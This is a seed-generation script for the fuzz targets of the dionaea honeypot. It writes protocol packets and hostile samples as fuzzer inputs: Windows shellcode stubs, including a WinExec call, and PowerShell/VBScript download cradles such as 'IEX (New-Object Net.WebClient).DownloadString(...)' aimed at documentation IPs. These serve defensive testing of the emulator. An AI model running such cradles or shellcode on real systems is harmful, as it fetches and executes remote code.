# This file is part of the dionaea honeypot
#
# SPDX-FileCopyrightText: none
#
# SPDX-License-Identifier: CC0-1.0

"""Write the seeds of the fuzz targets into corpus/<target>/ (python3 make_seeds.py).

The seeds come from the fixtures and test packets of the tests (tests/libemu,
tests/functional, tests/functional/unit) and are put into the input format of
each target. The fuzzers start from them and keep what they find in a corpus of
their own, outside the repository.

corpus/smb/smb1-session, smb1-rpc and smb2-session are not written here: they
are the bytes impacket 0.12.0 sent in one session each (SMB1: negotiate,
session setup, tree connect to IPC$, NT create of srvsvc, write of a DCERPC
bind, read; SMB1 with DCERPC binds and calls of srvsvc, wkssvc, spoolss, svcctl
and samr; SMB2: negotiate and session setup) to smbd of
tests/fuzz/python/standins.py.
"""

import hashlib
import struct
from pathlib import Path

HERE = Path(__file__).resolve().parent

# the shellcode samples of tests/libemu/test_libemu.c and the stager of tests/functional/test_emu.py
CALLPOP_XOR = bytes.fromhex("33c983e9b0e8ffffffffc05e8176 0e47132bc083eefce2f4bb79c08dafead43f".replace(" ", ""))
JMPCALL = bytes.fromhex("fcbbbf05ebd0eb0c5e56311ead01c385c075f7c3e8efffffff436f009753")
FNSTENV = bytes.fromhex("d9eed97424f45b31c9b18083ebfce2fb90909090")
WINEXEC = (b"\xe8\x00\x00\x00\x00\x5e\x31\xc9\xb1\x40\x83\xc3\x01\xe2\xfb\x6a\x01\x8d\x46\x18\x50"
           b"\xb8" + struct.pack("<I", 0x7c8623ad) + b"\xff\xd0\xc3" + b"cmd /c echo seed\x00")

# requests of the services (tests/functional, tests/functional/unit)
HTTP_GET = b"GET /index.html HTTP/1.1\r\nHost: 192.0.2.1\r\nUser-Agent: seed\r\n\r\n"
SMB_NEGOTIATE = bytes.fromhex(
    "00000054ff534d4272000000001843c80000000000000000000000000000fffe00000000"
    "00310002025043204e4554574f524b2050524f4752414d20312e3000024e54204c4d20302e313200")
MQTT_CONNECT = b"\x10\x16\x00\x04MQTT\x04\xc2\x00\x3c\x00\x04seed\x00\x01u\x00\x01p"


def write(target, name, data):
    folder = HERE / target
    folder.mkdir(exist_ok=True)
    (folder / name).write_bytes(data)


def u16(value):
    return struct.pack("<H", value)


def bistream():
    # op % 8: 0-2 add (dir, size u16, scale, bytes), 3-4 get (dir, how, ...), 5 discard, 6 clear, 7 arguments
    add_in = b"\x00\x00" + u16(len(HTTP_GET)) + b"\x00" + HTTP_GET
    add_out = b"\x01\x01" + u16(17) + b"\x00" + b"HTTP/1.1 200 OK\r\n"
    get_all = b"\x03\x00\x00"                     # in, from the base, to the end
    get_range = b"\x03\x00\x04" + u16(4) + u16(10)
    discard = b"\x05\x00\x00" + u16(16)
    write("bistream", "http", add_in + add_out + get_all + get_range + discard + get_all + b"\x06" + get_all)
    # chunk sized adds and the doubling of the last chunk
    write("bistream", "chunks", (b"\x00\x00" + u16(0x4000) + b"\x00") + (b"\x00\x00" + u16(1) + b"\x00A") * 8 +
          b"\x01\x01" + u16(0x8000) + b"\x05" + get_all + b"\x05\x00\x03")
    write("bistream", "second", b"\x80\x00" + u16(64) + b"\x00" + b"x" * 64 + b"\x83\x00\x00" + b"\x87\x02")


def processor():
    # limits, then per op: connection (op & 3), op >> 2 % 8 == 7 ends it, else io (how: dir, large)
    def io(conn, direction, data):
        return bytes([conn]) + bytes([direction]) + bytes([len(data) - 1]) + data
    write("processor", "smb", b"\x00" + io(0, 0, SMB_NEGOTIATE) + io(0, 1, SMB_NEGOTIATE[:40]) +
          io(0, 0, b"\x00\xff'\\"))
    write("processor", "limits", b"\x05" + io(0, 0, HTTP_GET) + io(1, 0, HTTP_GET) + io(2, 0, HTTP_GET) +
          bytes([0 | 7 << 2]) + io(1, 1, b"HTTP/1.1 200 OK\r\n"))
    write("processor", "shellcode", b"\x0a" + io(3, 0, WINEXEC) + io(3, 0, CALLPOP_XOR))
    # a large read: how with 0x80, scale in bits 1-3, size u16, the pattern of its first bytes
    write("processor", "large", b"\x02\x00\x86" + u16(0x8000) + MQTT_CONNECT)


def profile():
    # function (name index, args), per arg: kind, name index, value; return (0 default, 1 int)
    def string(text):
        return b"\x02\x00" + bytes([len(text)]) + text

    def bytea(data):
        return b"\x06\x06" + u16(len(data)) + data
    url = string(b"http://192.0.2.1/x.exe")
    write("profile", "download", b"\x01\x02" + url + string(b"x.exe") + b"\x01\x00\x00\x00\x00")
    write("profile", "winexec", b"\x02\x02" + string(b"cmd /c echo seed") + b"\x00\x05\x00\x01\x00\x00\x00\x00\x00")
    write("profile", "fwrite", b"\x0b\x02" + bytea(b"MZ\x90\x00\x03\"\\") + b"\x07\x00\x00\x10\x00\x00\x00\x00")
    # connect with a pointer to a struct of a short, a port and an ip
    write("profile", "connect",
          b"\x05\x03"                          # connect, 3 arguments
          b"\x00\x00\x03\x00\x00\x00"          # an int
          b"\x08\x03\x00\x10\x00\x00\x03"      # a pointer to a struct of 3 members:
          b"\x01\x01\x02\x00"                  # a short,
          b"\x04\x02\x00\x50"                  # a port,
          b"\x03\x04\xc0\x00\x02\x01"          # an ip
          b"\x00\x05\x10\x00\x00\x00\x00")     # an int; the default return value


def shellcode():
    for name, data in (("callpop_xor", CALLPOP_XOR), ("jmpcall", JMPCALL), ("fnstenv", FNSTENV),
                       ("winexec", WINEXEC), ("http", HTTP_GET), ("smb", SMB_NEGOTIATE)):
        write("shellcode", name, data)


def stream(data):
    """the input of a Python service target: no cuts, the stream"""
    return b"\x00" + data


def mqtt():
    def connect(clientid=b"seed", level=4, properties=b""):
        payload = b"".join(struct.pack("!H", len(x)) + x for x in (clientid, b"admin", b"secret"))
        body = b"\x00\x04MQTT" + bytes([level]) + b"\xc2" + struct.pack("!H", 60) + properties + payload
        return b"\x10" + bytes([len(body)]) + body
    publish = b"\x30\x0e" + struct.pack("!H", 9) + b"sensors/1" + b"hello"
    publish_qos1 = b"\x32\x10" + struct.pack("!H", 9) + b"sensors/1" + b"\x00\x07" + b"hello"
    subscribe = b"\x82\x0e\x00\x01" + struct.pack("!H", 9) + b"sensors/2" + b"\x00"
    write("mqtt", "mqtt311", stream(connect() + subscribe + publish + publish_qos1 + b"\xc0\x00\xe0\x00"))
    write("mqtt", "mqtt5", stream(connect(level=5, properties=b"\x00") + b"\x30\x0f" + struct.pack("!H", 9) +
                                  b"sensors/1" + b"\x00hello" + b"\x82\x0f\x00\x02\x00" + struct.pack("!H", 9) +
                                  b"sensors/2" + b"\x01"))
    write("mqtt", "pubrel", stream(connect() + b"\x62\x02\x00\x07" + b"\x34\x10" + struct.pack("!H", 9) +
                                   b"sensors/1\x00\x08hello"))


def mongo():
    def document(payload=b"\x10isMaster\x00\x01\x00\x00\x00"):
        return struct.pack("<i", 4 + len(payload) + 1) + payload + b"\x00"

    def message(opcode, body, request_id=1):
        return struct.pack("<iiii", 16 + len(body), request_id, 0, opcode) + body
    query = message(2004, struct.pack("<i", 0) + b"admin.$cmd\x00" + struct.pack("<ii", 0, -1) + document())
    command = message(2010, b"test\x00isMaster\x00" + document() + document(), 2)
    buildinfo = message(2010, b"admin\x00buildinfo\x00" + document(b"\x10buildinfo\x00\x01\x00\x00\x00") +
                        document(b"\x02s\x00\x02\x00\x00\x00x\x00"), 3)
    write("mongo", "query", stream(query))
    write("mongo", "commands", stream(command + buildinfo + query))


def http_multipart():
    boundary = b"capture-boundary"

    def multipart(body, extra=b""):
        return bytes([len(boundary)]) + boundary + bytes([len(extra)]) + extra + body

    def part(payload, headers=b'Content-Disposition: form-data; name="file"; filename="sample.bin"'):
        return b"--" + boundary + b"\r\n" + headers + b"\r\n\r\n" + payload + b"\r\n"
    end = b"--" + boundary + b"--\r\n"
    write("http_multipart", "file", multipart(part(b"MZ\x90\x00 data\r\n--capture") + end))
    write("http_multipart", "fields", multipart(part(b"value", b'Content-Disposition: form-data; name="a"') +
                                                part(b"x", b'Content-Disposition: form-data; name="b"; filename="b"')
                                                + end, b'; charset="utf-8"'))
    inner = b"--inner\r\nContent-Disposition: file; filename=\"c.txt\"\r\n\r\nccc\r\n--inner--\r\n"
    write("http_multipart", "mixed", multipart(part(inner, b'Content-Disposition: form-data; name="files"\r\n'
                                                           b"Content-Type: multipart/mixed; boundary=inner") + end))
    write("http_multipart", "lf", multipart((part(b"lf") + end).replace(b"\r\n", b"\n")))


def emu_scripts():
    write("emu_scripts", "powershell", b'$wc = New-Object System.Net.WebClient\r\n'
          b'$url = "http://203.0.113.5:8080/a/b.exe"\r\n$wc.DownloadFile($url, "c:\\x.exe")\r\n'
          b"# (New-Object Net.WebClient).DownloadString('http://198.51.100.1/no')\r\n"
          b"IEX (New-Object Net.WebClient).DownloadString('http://' + '198.51.100.2/p.ps1')\r\n")
    write("emu_scripts", "cmdlets", b"iwr -Uri 'http://192.0.2.7/x' -OutFile x; Invoke-RestMethod $u\r\n"
          b"$u = 'https://example.org/y'\r\nStart-BitsTransfer -Source http://192.0.2.8/z -Destination z\r\n"
          b"<# Invoke-WebRequest http://192.0.2.9/c #>\r\n")
    write("emu_scripts", "vbscript", b'Set http = CreateObject("Msxml2.XMLHTTP")\r\n'
          b'u = "http://example.org/x.bin"\r\nhttp.Open "GET", u, False\r\n'
          b"' http.Open \"GET\", \"http://example.org/no\"\r\nrem x\r\n")
    write("emu_scripts", "raw", b"junk ftp://198.51.100.7/f.sh and https://example.com/q?a=1 junk")


def main():
    bistream()
    processor()
    profile()
    shellcode()
    mqtt()
    mongo()
    http_multipart()
    emu_scripts()
    for folder in sorted(p for p in HERE.iterdir() if p.is_dir()):
        files = sorted(folder.iterdir())
        print(folder.name, len(files), sum(f.stat().st_size for f in files),
              hashlib.sha256(b"".join(f.read_bytes() for f in files)).hexdigest()[:12])


if __name__ == "__main__":
    main()
